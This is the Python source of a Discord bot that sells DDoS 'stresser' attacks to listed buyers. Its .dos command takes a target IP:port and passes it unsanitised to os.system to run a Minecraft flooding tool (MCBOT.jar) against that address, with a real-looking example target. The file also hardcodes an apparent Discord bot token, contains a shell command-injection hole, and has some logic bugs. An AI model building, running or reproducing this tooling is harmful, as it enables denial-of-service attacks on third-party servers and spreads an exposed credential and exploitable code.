import os
try:
	import discord
except ImportError:
	os.system("pip install discord")
try:
	import colorama
except ImportError:
	os.system("pip install colorama")
from discord.ext import commands    
from discord.ext.commands import Bot 
from os import system        
from os import name                  
from colorama import *                                                
import random, datetime, discord                        
#=====User && Methods Setting=====#
members = []  #          
admins  = [1147029888990199808]  #   ID users            
owners  = [1147029888990199808]  #          
methods = ['CLOUDFLARE'] # Methods
apua = ['help']
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTIwNDc1NDYxMjMxODUwMjkxMg.GzL4hu.87ivPhcOrWaDYZkl1NvF8pCjmYS3g2KWvLIpA0' # paste your token here
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True       
bot     = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")    
#=====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Northic Stresser | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Methods**", value = f"```yaml\nSLOW```")
        embed.add_field(name = "**Syntax**", value = "```md\n.ddos <method> <url> <thread> <time>```")
        embed.add_field(name = "**Example**", value = "```md\n.ddos SLOW realmi.fi 10 10```")
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks\n\n> Regards, \n> Northic Stresser.")
        embed.set_footer(text = f"©{year_now} Copyright pahwuu.")
        await ctx.send(embed=embed)
@bot.command()
async def add_member(ctx, member : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif member in members:
        await ctx.send(f'{member} has already copped a spot!')

    elif member is None:
        await ctx.send('Please give a buyer!!')

    else:
        members.append(member)
        await ctx.send('Added him/her!!')
        print('User Added!'); print(ctx.author); print("---------------")

@bot.command()
async def delete_member(ctx, member : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif member not in member:
        await ctx.send(f'{member} did not cop a spot!')

    elif member is None:
        await ctx.send('Please give a buyer!!')

    else:
        members.remove(member)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def cmd(ctx):
    await ctx.send("""Commands: 
    .help
    .cmd
    .ddos
    ----------------
    .add_member
    .delete_member
    .add_admin
    .delete_admin
                  """)

@bot.command()
async def delete_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def dos(ctx, address2 : str = None, timesec : str = None):
        if address2 is None:
            await ctx.send(f'Error! | You need a IP and port! | IP:PORT | 65.109.222.114:25565')
        elif timesec is None:
             await ctx.send('Enter time how long ddos is active')
        else:   
                embed = discord.Embed(title=f"Kyle Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                embed.add_field(name = "**Method**", value = f"```yaml\nbighandshake```")
                embed.add_field(name = "**Thread**", value = f"```yaml\n24000```")
                embed.add_field(name = "**Time**", value = f"```yaml\n240```")
                embed.add_field(name = "**Target**", value = f"```yaml\n{address2}```")
                embed.set_footer(text = f"©{year_now} Copyright Kyle Tran.")
                await ctx.send(embed=embed)
                system(f'java -jar MCBOT.jar {address2} 763 bighandshake {timesec} 2400')
                #java -jar MCBOT.jar 65.109.222.114:25565 763 bighandshake 240 2400

@bot.event
async def on_ready():
    banner = f"""
 _   _               _    _                   ___    _                                        
( ) ( )             ( )_ ( )     _           (  _`\ ( )_                                      
| `\| |   _    _ __ | ,_)| |__  (_)   ___    | (_(_)| ,_) _ __   __    ___   ___    __   _ __ 
| , ` | /'_`\ ( '__)| |  |  _ `\| | /'___)   `\__ \ | |  ( '__)/'__`\/',__)/',__) /'__`\( '__)
| |`\ |( (_) )| |   | |_ | | | || |( (___    ( )_) || |_ | |  (  ___/\__, \\__, \(  ___/| |   
(_) (_)`\___/'(_)   `\__)(_) (_)(_)`\____)   `\____)`\__)(_)  `\____)(____/(____/`\____)(_)   
                                                                                                                                                                                        
    """
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print(banner)
    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
    print('\033[1;97m=============================================================')
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"Minecraft"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"Minecraft"))
if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
